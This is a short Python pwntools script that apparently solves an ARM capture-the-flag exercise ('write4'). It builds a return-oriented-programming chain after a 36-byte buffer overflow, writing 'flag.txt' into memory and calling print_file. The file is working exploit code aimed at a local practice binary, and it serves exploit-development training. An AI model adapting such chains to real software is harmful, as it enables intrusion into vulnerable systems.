from pwn import *

context.arch = 'arm'
context.log_level = 'info'

pop_r3_r4_pc     = 0x000105f0
pop_r0_pc        = 0x000105f4
gadget_str_r3_r4 = 0x000105ec
print_file_plt   = 0x000104b0
bss_addr         = 0x0002102c

OFFSET = 36

def write_4_bytes(value, address):
    p  = p32(pop_r3_r4_pc) 
    p += p32(value)     
    p += p32(address)    
    p += p32(gadget_str_r3_r4) 
    p += p32(0)         
    p += p32(0)           
    return p

payload  = b'A' * OFFSET

payload += write_4_bytes(u32(b"flag"), bss_addr)

payload += write_4_bytes(u32(b".txt"), bss_addr + 4)
payload += p32(pop_r0_pc)
payload += p32(bss_addr)
payload += p32(print_file_plt)

p = process(['qemu-arm', '-L', '../split/armroot', './write4_armv5'])
p.sendline(payload)
p.interactive()